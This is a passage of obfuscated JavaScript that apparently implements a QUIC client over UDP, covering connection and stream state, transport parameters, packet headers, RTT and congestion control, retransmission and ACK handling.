                this['localLimit'] = a['localStreamData'];
                continue;
            case '4':
                this['connection'] = a;
                continue;
            case '5':
                this[kh(0xe5a)] = Buffer[kh(0x901)](0x0);
                continue;
            case '6':
                this[kh(0xb7a)] = 0x0;
                continue;
            case '7':
                this[kh(0xac3)] = ![];
                continue;
            case '8':
                this['id'] = b;
                continue;
            case '9':
                this[kh(0x871)] = new a0ci(a);
                continue;
            case '10':
                this[kh(0x729)] = c;
                continue;
            case '11':
                this[kh(0xb54)] = 0x0;
                continue;
            case '12':
                this['consumed'] = 0x0;
                continue;
            }
            break;
        }
    }
    [a0d9(0xc5e)](a, b) {
        const ki = a0d9, c = {
                'ZnFFf': function (d, f) {
                    return d(f);
                }
            };
        this[ki(0x871)]['append'](a, c[ki(0x320)](Boolean, b)), this[ki(0x9dd)][ki(0x98e)](this);
    }
}
class a0cw {
    constructor(a) {
        const kj = a0d9, b = {
                'KbNcq': kj(0x934),
                'RpFkN': function (f, g) {
                    return f << g;
                },
                'LklyR': function (f, g) {
                    return f * g;
                },
                'cLpYG': function (f, g) {
                    return f(g);
                },
                'oIGlY': function (f, g) {
                    return f << g;
                }
            }, c = b[kj(0x1e7)][kj(0xa6a)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this['retransmits'] = 0x0;
                continue;
            case '1':
                this[kj(0x964)] = [
                    [],
                    [],
                    []
                ];
                continue;
            case '2':
                this[kj(0xfa8)] = [
                    null,
                    null,
                    null
                ];
                continue;
            case '3':
                this['streams'] = new Map();
                continue;
            case '4':
                this[kj(0xa47)] = ![];
                continue;
            case '5':
                this['appKeyPhase'] = 0x0;
                continue;
            case '6':
                this[kj(0x918)] = ![];
                continue;
            case '7':
                this[kj(0x530)] = null;
                continue;
            case '8':
                this[kj(0x451)] = a[kj(0x451)] || b[kj(0x97e)](0x1, 0x14);
                continue;
            case '9':
                this[kj(0xd84)] = ![];
                continue;
            case '10':
                this['congestionWindow'] = this[kj(0x1028)];
                continue;
            case '11':
                this['lastReceived'] = 0x0;
                continue;
            case '12':
                this[kj(0x717)] = 0x3;
                continue;
            case '13':
                this[kj(0xb25)] = ![];
                continue;
            case '14':
                this[kj(0x1d9)] = null;
                continue;
            case '15':
                this['cryptoSend'] = [
                    new a0ci(this),
                    new a0ci(this),
                    new a0ci(this)
                ];
                continue;
            case '16':
                this['appSendKeys'] = [
                    null,
                    null
                ];
                continue;
            case '17':
                this[kj(0x1025)] = a[kj(0x1025)] || function () {
                };
                continue;
            case '18':
                this['tls'] = new a0ct(this[kj(0xd6c)], this['alpn'], this[kj(0x496)]);
                continue;
            case '19':
                this[kj(0x1028)] = a[kj(0x1028)] || b[kj(0xbac)](0xa, this['maxPacket']);
                continue;
            case '20':
                this[kj(0xc6a)] = Infinity;
                continue;
            case '21':
                this[kj(0x7e3)] = a[kj(0x7e3)] || function () {
                };
                continue;
            case '22':
                this[kj(0x370)] = 0x0;
                continue;
            case '23':
                this[kj(0xd00)] = a[kj(0xd00)];
                continue;
            case '24':
                this[kj(0xbc8)] = 0x0;
                continue;
            case '25':
                this[kj(0x1058)] = null;
                continue;
            case '26':
                this['recvRanges'] = [
                    [],
                    [],
                    []
                ];
                continue;
            case '27':
                this['maxInflight'] = a[kj(0xfb4)] || 0x100;
                continue;
            case '28':
                this[kj(0x59e)] = null;
                continue;
            case '29':
                this[kj(0x3d8)] = null;
                continue;
            case '30':
                this[kj(0x45a)] = a0k[kj(0x7bb)](0x8);
                continue;
            case '31':
                this[kj(0x7ca)] = a[kj(0x7ca)] === !![];
                continue;
            case '32':
                this['maxPacket'] = a['maxPacket'] || a0bX;
                continue;
            case '33':
                this[kj(0x102e)] = null;
                continue;
            case '34':
                this[kj(0x813)] = a['localMaxData'] || 0x1 << 0x16;
                continue;
            case '35':
                this['alpn'] = a[kj(0xe35)] || a0bR;
                continue;
            case '36':
                this[kj(0xb16)] = this['maxInflight'] * this[kj(0xad3)];
                continue;
            case '37':
                this['onClose'] = a[kj(0xba9)] || function () {
                };
                continue;
            case '38':
                this['nextLocalStream'] = 0x0;
                continue;
            case '39':
                this[kj(0xd6c)] = a[kj(0xd6c)] || a[kj(0xd00)];
                continue;
            case '40':
                this['peerMaxAckDelay'] = 0x19;
                continue;
            case '41':
                this[kj(0xc10)] = Buffer[kj(0x901)](0x0);
                continue;
            case '42':
                this[kj(0x4c7)] = a[kj(0x9d9)];
                continue;
            case '43':
                this[kj(0x85e)] = a[kj(0x85e)] === undefined ? 0x3e8 : a[kj(0x85e)];
                continue;
            case '44':
                this[kj(0xc4b)] = [];
                continue;
            case '45':
                this[kj(0x396)] = a[kj(0x396)] === undefined ? 0x7530 : a[kj(0x396)];
                continue;
            case '46':
                this['registered'] = ![];
                continue;
            case '47':
                this[kj(0x496)] = b[kj(0x72f)](a0cq, [
                    [
                        a0c4[kj(0x7b5)],
                        this[kj(0x396)]
                    ],
                    [
                        a0c4[kj(0x95d)],
                        this[kj(0x813)]
                    ],
                    [
                        a0c4['initialMaxStreamDataBidiLocal'],
                        this[kj(0x451)]
                    ],
                    [
                        a0c4[kj(0x639)],
                        this[kj(0x451)]
                    ],
                    [
                        a0c4[kj(0x659)],
                        this[kj(0x451)]
                    ],
                    [
                        a0c4[kj(0xf03)],
                        0x1 << 0x18
                    ],
                    [
                        a0c4[kj(0x9d8)],
                        b[kj(0xe69)](0x1, 0x18)
                    ],
                    [
                        a0c4['maxUdpPayloadSize'],
                        this['maxPacket']
                    ],
                    [
                        a0c4[kj(0x935)],
                        0x8
                    ],
                    [
                        a0c4[kj(0x804)],
                        this[kj(0x45a)]
                    ]
                ]);
                continue;
            case '48':
                this[kj(0x5d4)] = 0xfa;
                continue;
            case '49':
                this[kj(0x622)] = [
                    new a0cj(),
                    new a0cj(),
                    new a0cj()
                ];
                continue;
            case '50':
                this['settle'] = null;
                continue;
            case '51':
                this[kj(0x1039)] = null;
                continue;
            case '52':
                this[kj(0x253)] = ![];
                continue;
            case '53':
                this[kj(0x3b3)] = 0x0;
                continue;
            case '54':
                this[kj(0x5c6)] = a[kj(0x5c6)];
                continue;
            case '55':
                this[kj(0x482)] = 0x0;
                continue;
            case '56':
                this[kj(0x199)] = ![];
                continue;
            case '57':
                this[kj(0xccd)] = a[kj(0xccd)] || function () {
                };
                continue;
            case '58':
                this[kj(0xfae)] = 0x0;
                continue;
            case '59':
                this[kj(0x5a8)] = ![];
                continue;
            case '60':
                this[kj(0x580)] = [];
                continue;
            case '61':
                this[kj(0x403)] = [];
                continue;
            case '62':
                this[kj(0x928)] = 0x0;
                continue;
            case '63':
                this[kj(0x9e2)] = b['LklyR'](0x2, this[kj(0xad3)]);
                continue;
            case '64':
                this[kj(0xfd8)] = {
                    'rx': 0x0,
                    'tx': 0x0,
                    'rxBytes': 0x0,
                    'txBytes': 0x0,
                    'dropped': 0x0,
                    'retransmits': 0x0
                };
                continue;
            case '65':
                this[kj(0x3f0)] = [
                    -0x1,
                    -0x1,
                    -0x1
                ];
                continue;
            case '66':
                this[kj(0xfdd)] = a0k[kj(0x7bb)](0x8);
                continue;
            case '67':
                this[kj(0x7dc)] = 0x0;
                continue;
            case '68':
                this['sendReady'] = [];
                continue;
            case '69':
                this[kj(0x2f3)] = ![];
                continue;
            case '70':
                this[kj(0x6ce)] = [
                    0x0,
                    0x0,
                    0x0
                ];
                continue;
            case '71':
                this[kj(0xc7b)] = a[kj(0xc7b)] || function () {
                };
                continue;
            case '72':
                this[kj(0x91d)] = 0x0;
                continue;
            case '73':
                this[kj(0xa7b)] = [
                    ![],
                    ![],
                    ![]
                ];
                continue;
            case '74':
                this[kj(0x58a)] = a[kj(0x58a)] || b[kj(0x97e)](0x1, 0x14);
                continue;
            case '75':
                this['peerToken'] = Buffer[kj(0x901)](0x0);
                continue;
            case '76':
                this[kj(0x8b0)] = Buffer[kj(0x901)](0x0);
                continue;
            }
            break;
        }
    }
    get [a0d9(0x394)]() {
        const kk = a0d9, a = {
                'RCsfr': function (b, c) {
                    return b === c;
                }
            };
        return a[kk(0x1010)](this[kk(0xa47)], !![]);
    }
    set [a0d9(0x394)](a) {
        const kl = a0d9, b = { 'LBDrh': 'registration\x20failed' };
        this[kl(0xa47)] = a === !![], this[kl(0xa47)] && !this[kl(0x59e)] && !this[kl(0x2f3)] && this[kl(0x76b)](b['LBDrh']);
    }
    ['connect']() {
        const km = a0d9, a = {
                'xtLxY': function (b, c) {
                    return b + c;
                },
                'aMJLN': km(0x102b),
                'rEZQl': 'udp4',
                'cuPNN': km(0x769),
                'yuxFH': km(0xfcc)
            };
        return new Promise((b, c) => {
            const ko = km, d = {
                    'rDCVb': function (f, g) {
                        const kn = a0b;
                        return a[kn(0x556)](f, g);
                    },
                    'tryOI': a[ko(0x27d)],
                    'CZBkS': ko(0x143)
                };
            this[ko(0x975)] = {
                'resolve': b,
                'reject': c
            }, this[ko(0x102e)] = a0aG[ko(0xba8)](a[ko(0xf77)]), this[ko(0x102e)]['on'](a[ko(0x546)], f => {
                const kp = ko;
                try {
                    this['_onDatagram'](f);
                } catch (g) {
                    this[kp(0x252)](d[kp(0xa78)](d[kp(0xa0e)], g));
                }
            }), this[ko(0x102e)]['on'](a[ko(0x6dc)], f => {
                const kq = ko;
                !this[kq(0x59e)] && this[kq(0x252)](d['CZBkS'] + f['message']);
            }), this[ko(0x102e)][ko(0xe0e)](0x0, ko(0xdd6), () => this[ko(0xf66)]());
        });
    }
    ['_start']() {
        const kr = a0d9, a = {
                'ZZOCh': function (d, f, g) {
                    return d(f, g);
                },
                'njeab': function (d, f) {
                    return d + f;
                },
                'oAamV': kr(0x215),
                'Nnwjw': '\x20alpn='
            }, b = kr(0xf4d)['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[kr(0xfa8)][a0bZ] = a0cf(this[kr(0xfdd)], !![]);
                continue;
            case '1':
                this[kr(0xbc8)] = Date[kr(0x8da)]();
                continue;
            case '2':
                this[kr(0x9f9)][a0bZ][kr(0x4e1)](this[kr(0xeb3)][kr(0x9cf)](), ![]);
                continue;
            case '3':
                this[kr(0x1039)] = a[kr(0x7fe)](setInterval, () => this[kr(0x6e3)](), 0x14);
                continue;
            case '4':
                this[kr(0x893)] = Date[kr(0x8da)]();
                continue;
            case '5':
                this[kr(0x6e3)]();
                continue;
            case '6':
                this[kr(0x4c7)][kr(0xac2)](a[kr(0x881)](a[kr(0x881)](a[kr(0x881)](a[kr(0xf84)] + this['host'] + ':', this['port']) + a[kr(0xb23)], this[kr(0xe35)]), '\x20dcid=') + this[kr(0xfdd)][kr(0x43a)](kr(0x1a2)));
                continue;
            }
            break;
        }
    }
    [a0d9(0x6e3)]() {
        const ks = a0d9, a = {
                'LaKuT': function (d, f) {
                    return d >= f;
                },
                'ycEFt': function (d, f) {
                    return d < f;
                },
                'HNdxC': function (d, f) {
                    return d < f;
                },
                'iTmIX': function (d, f) {
                    return d < f;
                },
                'PTPnS': function (d, f) {
                    return d === f;
                },
                'QAGIa': function (d, f) {
                    return d > f;
                },
                'MynPr': function (d, f) {
                    return d + f;
                },
                'TuTTF': ks(0xf09),
                'KeHMC': function (d, f) {
                    return d - f;
                }
            };
        if (this[ks(0x59e)])
            return;
        const b = Date['now']();
        this[ks(0xde4)](b);
        this[ks(0x85e)] && this[ks(0xd84)] && a[ks(0x558)](b - this[ks(0xbc8)], this[ks(0x85e)]) && (this['pingPending'] = !![]);
        let c = 0x0;
        while (a[ks(0x100d)](c, 0x10) && a['HNdxC'](this[ks(0x255)](), this[ks(0xfb4)]) && (a[ks(0xb1a)](this[ks(0xc50)](), this[ks(0x969)]()) || this[ks(0xf0f)]() || this[ks(0x2f3)])) {
            const d = this[ks(0x865)]();
            if (a[ks(0x1fd)](d, null))
                break;
            this[ks(0xeb4)](d), c += 0x1;
        }
        a[ks(0x5b2)](b - this['lastReceived'], Math[ks(0x37f)](this[ks(0x396)], 0x3a98)) && this[ks(0x252)](a[ks(0x402)](a['MynPr'](a['TuTTF'], a['KeHMC'](b, this[ks(0x893)])), 'ms'));
    }
    ['_totalInFlight']() {
        const kt = a0d9, a = {
                'tfApz': function (b, c) {
                    return b + c;
                }
            };
        return a[kt(0xed3)](this[kt(0x964)][0x0][kt(0xc54)] + this['inFlight'][0x1][kt(0xc54)], this[kt(0x964)][0x2]['length']);
    }
    [a0d9(0xf0f)]() {
        const ku = a0d9, a = {
                'WKzxk': function (b, c) {
                    return b < c;
                }
            };
        for (let b = 0x0; a['WKzxk'](b, 0x3); b++) {
            if (this[ku(0xfa8)][b] !== null && this[ku(0xa7b)][b] && this[ku(0xaa5)][b]['length'])
                return !![];
        }
        return ![];
    }
    [a0d9(0xc50)]() {
        const kv = a0d9, a = {
                'YTJGL': function (c, d) {
                    return c < d;
                }
            };
        let b = 0x0;
        for (let c = 0x0; a[kv(0xd2c)](c, 0x3); c++) {
            for (const d of this[kv(0x964)][c]) {
                b += d[kv(0xbce)];
            }
        }
        return b;
    }
    ['_sendWindow']() {
        const kw = a0d9;
        return this[kw(0xd84)] ? this[kw(0xce0)] : Infinity;
    }
    [a0d9(0xe88)]() {
        const kx = a0d9;
        return Math['max'](this[kx(0x5d4)] * Math['pow'](0x2, this[kx(0xfae)]), 0x14);
    }
    [a0d9(0x4f7)](a) {
        const ky = a0d9, b = {
                'krusg': function (c, d) {
                    return c === d;
                },
                'YaRxN': function (c, d) {
                    return c / d;
                },
                'veyZT': function (c, d) {
                    return c + d;
                },
                'gagbN': function (c, d) {
                    return c * d;
                },
                'hqmSj': function (c, d) {
                    return c / d;
                },
                'zBLBg': function (c, d) {
                    return c * d;
                },
                'wNrEk': function (c, d) {
                    return c + d;
                }
            };
        b[ky(0x1038)](this['srtt'], null) ? (this[ky(0x1d9)] = a, this['rttvar'] = b[ky(0x85d)](a, 0x2)) : (this[ky(0x1058)] = b['veyZT'](b[ky(0x42f)](this[ky(0x1058)], 0x3), Math[ky(0x675)](this[ky(0x1d9)] - a)) / 0x4, this['srtt'] = b[ky(0x911)](b[ky(0x2cb)](b['zBLBg'](this['srtt'], 0x7), a), 0x8)), this['pto'] = Math[ky(0xde8)](b['wNrEk'](this[ky(0x1d9)], b[ky(0x42f)](0x4, this[ky(0x1058)])) + this[ky(0x20e)]);
    }
    ['_onLoss'](a) {
        const kz = a0d9, b = {
                'ddzfD': function (c, d) {
                    return c + d;
                },
                'NOFrn': function (c, d) {
                    return c + d;
                },
                'USWUm': kz(0xa3f),
                'otvnN': kz(0x293),
                'fuPts': kz(0xa36),
                'jUFqV': function (c, d) {
                    return c === d;
                }
            };
        this['slowStartThreshold'] = Math[kz(0x37f)](Math['floor'](this[kz(0xce0)] / 0x2), 0x2 * this[kz(0x9e2)]), this[kz(0xce0)] = this[kz(0x9e2)], this[kz(0x4c7)][kz(0xac2)](b[kz(0x464)](b['NOFrn'](b[kz(0x8c0)](b[kz(0x8c0)](b['USWUm'], a0c2[a]) + kz(0x8f9), this['congestionWindow']), b[kz(0x448)]) + this['slowStartThreshold'], b[kz(0xcc3)]) + (b[kz(0x5ad)](this[kz(0x1d9)], null) ? '-' : Math[kz(0xde8)](this[kz(0x1d9)])) + 'ms');
    }
    [a0d9(0xde4)](a) {
        const kA = a0d9, b = {
                'GtEnj': function (c, d) {
                    return c < d;
                },
                'xdNjy': function (c, d) {
                    return c < d;
                },
                'sgOji': function (c, d) {
                    return c - d;
                },
                'GdqnL': function (c, d) {
                    return c + d;
                },
                'JIfZV': function (c, d) {
                    return c + d;
                },
                'JHzvk': function (c, d) {
                    return c + d;
                },
                'iGJtS': kA(0x567),
                'sYzdB': kA(0x1079),
                'tLoAd': function (c, d) {
                    return c + d;
                },
                'NbRDZ': kA(0x105d),
                'VDAiR': '\x20retransmits'
            };
        for (let c = 0x0; b[kA(0x51f)](c, 0x3); c++) {
            const d = this[kA(0x964)][c];
            if (!d[kA(0xc54)])
                continue;
            if (b[kA(0xaf7)](b[kA(0xf72)](a, d[0x0][kA(0x32e)]), this[kA(0xe88)]()))
                continue;
            const f = d[0x0];
            this[kA(0x964)][c] = d[kA(0x47b)](0x1), this[kA(0x7cb)](c, f), this[kA(0xfac)] += 0x1, this[kA(0xfd8)][kA(0xfac)] += 0x1, this['ptoCount'] += 0x1, this[kA(0x4c7)][kA(0xac2)](b[kA(0xc35)](b[kA(0xf94)](b[kA(0x230)](b[kA(0xc35)](b[kA(0xc35)](b[kA(0xcbe)], a0c2[c]), b[kA(0xf49)]), f['pn']), kA(0x8f1)) + this[kA(0x964)][c]['length'], kA(0x284)) + this[kA(0xe88)]());
            if (this[kA(0xfac)] > 0x18) {
                this[kA(0x252)](b['tLoAd'](b['JIfZV'](b[kA(0x341)], this[kA(0xfac)]), b['VDAiR']));
                return;
            }
        }
    }
    ['_returnLost'](a, b) {
        const kB = a0d9, c = {
                'KFgZT': function (d, f) {
                    return d + f;
                }
            };
        b['crypto'] && this[kB(0x9f9)][a][kB(0x831)]([b[kB(0x226)]]);
        for (const d of b[kB(0x9c3)]) {
            d['stream'][kB(0x871)][kB(0x831)]([{
                    'start': d[kB(0x373)],
                    'length': d['length']
                }]), d[kB(0xea6)] && d['stream'][kB(0x871)][kB(0x831)]([{
                    'start': c['KFgZT'](d[kB(0x373)], d[kB(0xc54)]),
                    'length': 0x0,
                    'fin': !![]
                }]), this[kB(0x98e)](d[kB(0x854)]);
        }
    }
    [a0d9(0x6c2)]() {
        const kC = a0d9;
        this[kC(0xfac)] = 0x0, this[kC(0xfae)] = 0x0;
    }
    [a0d9(0x13e)](a, b) {
        const kD = a0d9, c = {
                'DvaJF': function (d, f) {
                    return d === f;
                },
                'sMGmZ': function (d, f) {
                    return d + f;
                },
                'wIQFG': kD(0x8fb)
            };
        if (c[kD(0xa16)](this[kD(0xfa8)][a], null))
            return;
        this['keys'][a] = null, this[kD(0x964)][a] = [], this['log'][kD(0xac2)](c[kD(0xc9c)](c['sMGmZ'](c['wIQFG'] + a0c2[a], kD(0x8b7)) + b, ')'));
    }
    ['_flushHandshakeAck']() {
        const kE = a0d9, a = {
                'LnrBF': function (k, l) {
                    return k === l;
                },
                'OZpJN': function (k, l) {
                    return k(l);
                },
                'Ryucg': function (k, l) {
                    return k + l;
                },
                'hNTdD': function (k, l) {
                    return k === l;
                }
            }, b = a0c0, c = this[kE(0xfa8)][b];
        if (a[kE(0xd30)](c, null) || !this[kE(0xa7b)][b] || a[kE(0xd30)](this[kE(0xaa5)][b]['length'], 0x0))
            return;
        const d = a[kE(0x569)](a0cn, this['recvRanges'][b][kE(0x47b)](-0x10));
        this[kE(0xa7b)][b] = ![];
        const f = this[kE(0x6ce)][b]++, g = this[kE(0x745)](b, a[kE(0xded)](a0bW, d[kE(0xc54)]) + 0x10, f), h = Buffer['concat']([
                g[kE(0x1e8)],
                g['pnBytes']
            ]), i = Buffer['concat']([
                h,
                c['send'][kE(0x3fd)](f, h, d)
            ]), j = a0ck(c[kE(0x871)], i, g['pnOffset'], g[kE(0x848)]);
        if (a[kE(0xb36)](j, null)) {
            this['ackPending'][b] = !![];
            return;
        }
        this[kE(0xeb4)]({
            'epoch': b,
            'packet': j,
            'pn': f,
            'meta': {
                'crypto': null,
                'streams': []
            },
            'ackEliciting': ![]
        });
    }
    [a0d9(0x436)]() {
        const kF = a0d9, a = { 'gKpoO': kF(0x5c7) };
        if (this[kF(0x5a8)] || !this['handshakeComplete'] || !this['finishedSent'])
            return;
        this[kF(0x823)](), this[kF(0x5a8)] = !![], this[kF(0x13e)](a0c0, a[kF(0x491)]), this[kF(0x13e)](a0bZ, a['gKpoO']);
    }
    [a0d9(0xa77)](a) {
        const kG = a0d9, b = {
                'mWXft': function (d, f) {
                    return d === f;
                },
                'JuixM': function (d, f) {
                    return d + f;
                },
                'TLDlI': function (d, f) {
                    return d + f;
                },
                'NyGDI': function (d, f) {
                    return d + f;
                },
                'QXxtd': function (d, f) {
                    return d + f;
                },
                'gcAMp': function (d, f) {
                    return d + f;
                },
                'BZZJU': function (d, f) {
                    return d + f;
                },
                'vixET': function (d, f) {
                    return d + f;
                }
            }, c = 0x10;
        if (b['mWXft'](a, a0c1))
            return b['JuixM'](0x1 + this[kG(0xfdd)][kG(0xc54)], a0bW) + c;
        if (a === a0c0)
            return b[kG(0x52d)](b[kG(0xe36)](b[kG(0x8a2)](b[kG(0x609)](b[kG(0xe36)](0x1 + 0x4, 0x1) + this[kG(0xfdd)]['length'], 0x1), this[kG(0x45a)][kG(0xc54)]), 0x2) + a0bW, c);
        return b['gcAMp'](b[kG(0xd6a)](b[kG(0xd6a)](b[kG(0x609)](b[kG(0xe36)](b[kG(0x572)](b[kG(0x8a2)](b['vixET'](0x1, 0x4) + 0x1 + this['peerCid'][kG(0xc54)], 0x1), this[kG(0x45a)][kG(0xc54)]), a0c5(this['peerToken'][kG(0xc54)])), this['peerToken'][kG(0xc54)]), 0x2), a0bW), c);
    }
    [a0d9(0x745)](a, b, c) {
        const kH = a0d9, d = {
                'eIMrl': function (k, l) {
                    return k >>> l;
                },
                'YrYBd': function (k, l) {
                    return k === l;
                },
                'xVMNC': function (k, l) {
                    return k | l;
                },
                'KvGZs': function (k, l) {
                    return k << l;
                },
                'iRqQl': function (k, l) {
                    return k - l;
                },
                'OUyXm': function (k, l) {
                    return k + l;
                },
                'aKmmS': function (k, l) {
                    return k - l;
                },
                'StNzl': function (k, l) {
                    return k | l;
                }
            }, f = new a0c8(), g = Buffer['alloc'](a0bW);
        g[kH(0xb3f)](d[kH(0x430)](c, 0x0), 0x0);
        if (d['YrYBd'](a, a0c1))
            return f[kH(0x73b)](d[kH(0x58c)](0x40 | d[kH(0x104f)](this[kH(0x28d)], 0x2), d[kH(0x677)](a0bW, 0x1))), f[kH(0xbce)](this['peerCid']), {
                'header': f[kH(0x96c)](),
                'pnBytes': g,
                'pnOffset': d[kH(0xf17)](0x1, this[kH(0xfdd)][kH(0xc54)]),
                'long': ![]
            };
        const h = a === a0bZ ? 0x0 : 0x2;
        f[kH(0x73b)](d[kH(0x58c)](d['xVMNC'](0xc0, d[kH(0x104f)](h, 0x4)), d[kH(0x485)](a0bW, 0x1))), f[kH(0xb74)](a0bQ), f[kH(0x73b)](this[kH(0xfdd)]['length'])[kH(0xbce)](this[kH(0xfdd)]);
        d[kH(0xcc6)](a, a0bZ) ? (f['byte'](this[kH(0x45a)]['length'])[kH(0xbce)](this[kH(0x45a)]), f[kH(0x18d)](this['peerToken'][kH(0xc54)]), this[kH(0xc88)]['length'] && f[kH(0xbce)](this['peerToken'])) : f[kH(0x73b)](0x0)['bytes'](Buffer[kH(0x901)](0x0));
        const i = Buffer[kH(0x901)](0x2);
        i['writeUInt16BE'](d[kH(0x1046)](0x4000, b), 0x0), f[kH(0xbce)](i);
        const j = f[kH(0x96c)]();
        return {
            'header': j,
            'pnBytes': g,
            'pnOffset': j['length'],
            'long': !![]
        };
    }
    [a0d9(0xd2a)]() {
        const kI = a0d9, a = {
                'kTSxg': function (b, c) {
                    return b === c;
                }
            };
        for (const b of [
                a0bZ,
                a0c0,
                a0c1
            ]) {
            if (a['kTSxg'](this[kI(0xfa8)][b], null))
                continue;
            if (this[kI(0xa7b)][b] && this[kI(0xaa5)][b][kI(0xc54)])
                return b;
            if (this['_pendingOneOff'](b)['length'])
                return b;
            if (this['cryptoSend'][b][kI(0x50d)]['length'])
                return b;
            if (b === a0c1 && (this['sendReady'][kI(0xc54)] || this['creditReady']['length'] || this['pingPending'] || this[kI(0x2f3)]))
                return b;
        }
        return -0x1;
    }
    [a0d9(0x959)](a) {
        const kJ = a0d9;
        return this[kJ(0x403)][kJ(0x595)](b => b[kJ(0xb06)] === a);
    }
    [a0d9(0x865)]() {
        const kK = a0d9, a = {
                'LLniL': function (o, p) {
                    return o < p;
                },
                'Xbvui': function (o, p) {
                    return o - p;
                },
                'jMVni': function (o, p) {
                    return o(p);
                },
                'tdOIK': function (o, p) {
                    return o > p;
                },
                'ujiXa': function (o, p) {
                    return o - p;
                },
                'MAPPp': function (o, p) {
                    return o - p;
                },
                'jwHHV': function (o, p) {
                    return o === p;
                },
                'Isvoa': function (o, p) {
                    return o - p;
                },
                'kLvcR': kK(0x76b),
                'QVUwe': 'utf8',
                'FATJW': function (o, p) {
                    return o === p;
                },
                'jRLum': function (o, p) {
                    return o === p;
                },
                'WKwYs': function (o, p) {
                    return o === p;
                },
                'fJqOp': function (o, p) {
                    return o + p;
                },
                'gYWLL': function (o, p, q, r, s) {
                    return o(p, q, r, s);
                },
                'MluEB': kK(0xbf6)
            }, b = this[kK(0xd2a)]();
        if (a[kK(0x993)](b, 0x0))
            return null;
        let c = a[kK(0xffc)](this[kK(0xad3)], this['_headerOverhead'](b));
        if (a[kK(0x993)](c, 0x10))
            return null;
        const d = [], f = {
                'crypto': null,
                'streams': [],
                'ping': ![],
                'closing': ![],
                'oneOff': ![]
            };
        if (this['ackPending'][b] && this[kK(0xaa5)][b][kK(0xc54)]) {
            const o = a['jMVni'](a0cn, this[kK(0xaa5)][b][kK(0x47b)](-0x10));
            d[kK(0xb66)](o), c -= o[kK(0xc54)], this[kK(0xa7b)][b] = ![];
        }
        for (const p of this['_pendingOneOff'](b)) {
            if (a[kK(0xb5f)](p['frame'][kK(0xc54)], a[kK(0x761)](c, 0x10)))
                break;
            d[kK(0xb66)](p[kK(0x15e)]), c -= p[kK(0x15e)][kK(0xc54)], this[kK(0x403)]['splice'](this[kK(0x403)][kK(0xe0a)](p), 0x1), f[kK(0xb48)] = !![];
        }
        const g = this['cryptoSend'][b];
        if (g[kK(0x50d)]['length'] && a[kK(0xb5f)](c, 0x10)) {
            const q = g[kK(0x958)](a[kK(0x4cb)](c, 0xc)), r = new a0c8();
            r[kK(0x73b)](a0c3[kK(0x226)])[kK(0x18d)](q['start'])['varint'](q[kK(0xc54)])[kK(0xbce)](q['bytes']);
            const s = r[kK(0x96c)]();
            d[kK(0xb66)](s), c -= s['length'], f[kK(0x226)] = q;
        }
        a['jwHHV'](b, a0c1) && (this[kK(0xb04)](d, f, c), this[kK(0x92b)](d, f, Math[kK(0x100f)](c, a[kK(0xe1c)](this['_sendWindow'](), this['_inFlightBytes']()))));
        if (b === a0c1 && this['closing']) {
            const t = new a0c8();
            t['byte'](a0c3['applicationClose'])[kK(0x18d)](0x0)['varint'](0x0)[kK(0xbce)](Buffer[kK(0xca5)](this[kK(0x530)] || a['kLvcR'], a[kK(0x633)])[kK(0xad0)](0x0, 0x40)), d[kK(0xb66)](t[kK(0x96c)]()), f[kK(0x2f3)] = !![];
        } else
            a['FATJW'](b, a0c1) && this[kK(0x253)] && (d['push'](Buffer[kK(0xca5)]([a0c3[kK(0xbc9)]])), this[kK(0x253)] = ![], f[kK(0xbc9)] = !![]);
        if (!d[kK(0xc54)])
            return null;
        let h = Buffer[kK(0x83f)](d);
        if (a[kK(0x612)](b, a0bZ) && !this['handshakeComplete']) {
            const u = a[kK(0xe1c)](a[kK(0x4cb)](a0bY, this[kK(0xa77)](b)), h[kK(0xc54)]);
            u > 0x0 && (h = Buffer['concat']([
                h,
                Buffer[kK(0x901)](u)
            ]));
        }
        const i = this[kK(0x6ce)][b]++, j = a[kK(0x2f4)](b, a0c1) ? this[kK(0x6de)][this[kK(0x28d)]] : this[kK(0xfa8)][b][kK(0x871)], k = this['_header'](b, a[kK(0x988)](a[kK(0x988)](a0bW, h['length']), 0x10), i), l = Buffer[kK(0x83f)]([
                k[kK(0x1e8)],
                k['pnBytes']
            ]), m = Buffer['concat']([
                l,
                j[kK(0x3fd)](i, l, h)
            ]), n = a[kK(0xae5)](a0ck, j, m, k[kK(0x80d)], k[kK(0x848)]);
        if (a[kK(0x612)](n, null))
            return this[kK(0x252)](a['MluEB']), null;
        return {
            'epoch': b,
            'packet': n,
            'pn': i,
            'meta': f,
            'ackEliciting': Boolean(f[kK(0x226)] || f[kK(0x9c3)]['length'] || f['ping'] || f[kK(0x2f3)] || f[kK(0xb48)]),
            'summary': this[kK(0x85f)](d)
        };
    }
    [a0d9(0x85f)](a) {
        const kL = a0d9, b = {
                'PBIfZ': function (d, f) {
                    return d === f;
                },
                'RTbSz': kL(0x694),
                'dxRyM': function (d, f) {
                    return d === f;
                },
                'sEMgW': 'stream',
                'VQzwi': kL(0xce3),
                'qLFGn': function (d, f) {
                    return d === f;
                },
                'oCsdH': 'max-stream-data',
                'uDgyt': function (d, f) {
                    return d === f;
                },
                'HUbif': kL(0x2c0),
                'XjiJf': function (d, f) {
                    return d + f;
                }
            }, c = [];
        for (const d of a) {
            const f = d[0x0];
            if (b['PBIfZ'](f, a0c3['ack']))
                c[kL(0xb66)](b[kL(0x188)]);
            else {
                if (f === a0c3[kL(0x226)])
                    c[kL(0xb66)](kL(0x226));
                else {
                    if (f === a0c3['ping'])
                        c[kL(0xb66)](kL(0xbc9));
                    else {
                        if (b[kL(0x6f0)](f, a0c3['stream']))
                            c[kL(0xb66)](b[kL(0xeda)]);
                        else {
                            if (f === a0c3[kL(0x1a3)])
                                c[kL(0xb66)](b[kL(0x243)]);
                            else {
                                if (b[kL(0xc52)](f, a0c3[kL(0xae7)]))
                                    c[kL(0xb66)](b[kL(0x207)]);
                                else
                                    b[kL(0x607)](f, a0c3[kL(0xa6c)]) ? c[kL(0xb66)](b['HUbif']) : c[kL(0xb66)](b[kL(0x5e6)]('0x', f['toString'](0x10)));
                            }
                        }
                    }
                }
            }
        }
        return c['join'](',');
    }
    [a0d9(0xb04)](a, b, c) {
        const kM = a0d9, d = {
                'fENtS': function (f, g) {
                    return f - g;
                },
                'tPKCt': function (f, g) {
                    return f < g;
                }
            };
        if (this[kM(0x199)] && c > 0xc) {
            const f = new a0c8();
